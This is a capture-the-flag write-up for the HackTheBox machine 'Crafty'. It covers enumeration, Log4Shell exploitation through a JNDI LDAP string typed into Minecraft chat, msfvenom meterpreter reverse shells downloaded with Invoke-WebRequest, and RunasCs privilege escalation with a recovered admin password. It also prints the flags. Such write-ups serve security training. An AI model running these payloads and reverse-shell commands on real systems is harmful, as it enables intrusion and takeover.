---
aliases:
  - Crafty
Date: 2024-03-08
Platform: HackTheBox
Category: Machine
Difficulty: Easy
tags:
  - Windows
  - HackTheBox
  - "#Minecraft"
  - LDAP
Status: 
IP: 10.10.11.249
---

# Crafty

## Improved skills
- Remote Code Execution

## Used tools
- nmap
- gobuster
- Metasploit
- Java Decompiler
- Runas

---

# Information Gathering

## Nmap

Scanned all TCP ports
Nothing interesting port **25565** and **Minecraft 1.16.5** version

```bash
┌──(kali㉿kali)-[~/Machine]
└─$ sudo nmap -sT -sV -p- crafty.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 15:52 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.036s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Gobuster

Scanned all possibility directory
Nothing of interesting i found for directory enumeration

```bash
┌──(kali㉿kali)-[~/Machine]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u crafty.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crafty.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 1826]
/img                  (Status: 301) [Size: 145] [--> http://crafty.htb/img/]
/Home                 (Status: 200) [Size: 1826]
/css                  (Status: 301) [Size: 145] [--> http://crafty.htb/css/]
/js                   (Status: 301) [Size: 144] [--> http://crafty.htb/js/]
/IMG                  (Status: 301) [Size: 145] [--> http://crafty.htb/IMG/]
/CSS                  (Status: 301) [Size: 145] [--> http://crafty.htb/CSS/]
/Img                  (Status: 301) [Size: 145] [--> http://crafty.htb/Img/]
/JS                   (Status: 301) [Size: 144] [--> http://crafty.htb/JS/]
/HOME                 (Status: 200) [Size: 1826]
/coming-soon          (Status: 200) [Size: 1206]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================

```

---

# Exploitation
## Apache Log4j Remote Code Execution Vulnerability - CVE-2021-44228

The Minecraft 1.16.5 version have the Log4j dll vulnerable to this [CVE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-44228).
I found the exploit in this [github repository](https://github.com/kozmer/log4j-shell-poc) the proof of concept.
To exploit this vulnerability we need the [TLAUNCHER](https://tlauncher.org/jar) to play minecraft.

First step clone the repository and edit the poc.py file because the own machine is Windows and this python script it is thought, so edit the line 26 from **String cmd="/bin/bash";** to **String cmd="cmd.exe";**. 

![Terminal](../../../Images/Pasted%20image%2020240310225653.png)


Setup **PoC** and obtained an **LDAP URL**.  
![Terminal](../../../Images/Pasted%20image%2020240310235407.png)

```python
$ python3 poc.py --userip tun0 --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

Then setup the listener 
``` python
nc -lvnp 9001

```

Ok once setup the Poc and the listener can we start the **[TLAUNCHER](https://tlauncher.org/jar)** with the Fabric 1.16.5 version 
![Terminal](../../../Images/Pasted%20image%2020240309144937.png)


Now connect the multiplayer server (if don't see click add Server and put the IP:25565).
![Terminal](../../../Images/Pasted%20image%2020240309145213.png)


When the game started press *T* and type the **LDAP URL** in the chat and press enter.

``` text
${jndi:ldap://localhost:1389/a}
```

Now we have the reverse shell spawned in the listener, in the directory **C:\\Users\\svc_minecraft\\Desktop** is found the user flag.

```text
2aba9772865ac1ab21ec3764bba43658
```
---

# Privilege Escalation

To execute the privilege escalation we can manipulate the **SNAPSHOT.jar** under the plugins folder. Ok now to get this file in my local machine i need to create  another reverse shell. 

First we get the system information to create the appropriate reverse shell, type systeminfo in target machine

``` cmd
c:\Users\svc_minecraft>systeminfo                                                                                     
systeminfo                                                                                                            
                                                                                                                      
Host Name:                 CRAFTY                                                                                     
OS Name:                   Microsoft Windows Server 2019 Standard                                                     
OS Version:                10.0.17763 N/A Build 17763                                                                 
OS Manufacturer:           Microsoft Corporation                                                                      
OS Configuration:          Standalone Server                                                                          
OS Build Type:             Multiprocessor Free                                                                        
Registered Owner:          Windows User                                                                               
Registered Organization:                                                                                              
Product ID:                00429-00521-62775-AA944                                                                    
Original Install Date:     4/10/2020, 9:48:06 AM                                                                      
System Boot Time:          3/8/2024, 4:15:57 PM                                                                       
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,071 MB
Virtual Memory: Max Size:  4,902 MB
Virtual Memory: Available: 2,768 MB
Virtual Memory: In Use:    2,134 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CRAFTY                                        
Hotfix(s):                 N/A                                             
Network Card(s):           1 NIC(s) Installed.                             
                           [01]: vmxnet3 Ethernet Adapter                  
                                 Connection Name: Ethernet0                                                                                            
                                 DHCP Enabled:    No                       
                                 IP address(es)                            
                                 [01]: 10.10.11.249                        
                                 [02]: fe80::16e9:912b:c6e2:e027                                                                                       
                                 [03]: dead:beef::ab03:8159:2fb9:c141                                                                                  
                                 [04]: dead:beef::1be
``` 
 
I help my self by using **msfvenom** to create a .exe file contains a reverse shell to execute in the target machine.
``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=10.10.16.98 LPORT=8989 -o /home/kali/Machine/Crafty/reverse.exe

```
i set up a http server using python

``` python
sudo python3 -m http.server
```

now in the target machine i download this file using **Invok-WebRequest**  powershell tool. (type powershell in cmd to switch in powershell environment )


``` powershell
powershell

Invoke-WebRequest -Uri "http://10.10.16.98:8000/r
everse.exe" -OutFile "C:\users\svc_minecraft\Desktop\rev.exe"  
```

set up listener in kali machine using **msfconsole** and type this command

``` bash
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 8989
run
```
Execute the reverse shell 

``` powershell
..\Desktop\rev.exe
```
no in the listener download the .jar file

``` bash
	download playercounter-1.0_SNAPSHOT.jar
```

Now to decompile this i use this [java-decompiler](http://java-decompiler.github.io). I found interesting class
![Terminal](../../../Images/Pasted%20image%2020240309234035.png)

I go to the **[Constructor](https://www.w3schools.com/java/java_constructors.asp)** of the class Rcon and i noticed that the third parameter is the password!

Ok now i have the administrator pwd but how can use to run a reverse shell with root privilege? Using the **[Runas](https://github.com/antonioCoco/RunasCs/releases?source=post_page-----316a735a306d--------------------------------)**. Runas is a tool which will allow to run a process with different privilege. 

Once download the Runas's zip take the '**RunasCs.exe**', that file will execute in the target machine but first create another reverse shell using **msfvenom**

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=8990 -f exe >> rev2.exe

```
Now put this 2 file (The reverse shell and the RunasCs.exe) in the target machine. How? Using the previously listener in **msfconsole**  and type 

``` bash
upload <filePath>/rev2.exe
upload <filePath>/RunasCs.exe

```
Ok now to intercept the root's reverse shell i need to set another listener i use again **msfconsole** in a different tab and type (remember to change the port)

``` bash
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 8990
run
```

I have all ready!! Execute the reverse shell using the **RunasCs.exe** the password administrator and the new reverse shell.


![Terminal](../../../Images/Pasted%20image%2020240310003354.png)

Ok in the lister now i have the root's shell 
![Terminal](../../../Images/Pasted%20image%2020240310003432.png)

Go to the Administrator desktop and take the root flag.
![Terminal](../../../Images/Pasted%20image%2020240310003533.png)




---

# Trophy & Loot

| User          | Password      |
| ------------- | ------------- |
| Administrator | s67u84zKq8IXw |


| User         | Flag                             |
| ------------ | -------------------------------- |
| user.txt<br> | 2aba9772865ac1ab21ec3764bba43658 |
| root.txt     | 63e2d80fb9ba9c1d204d842acf8914e1 |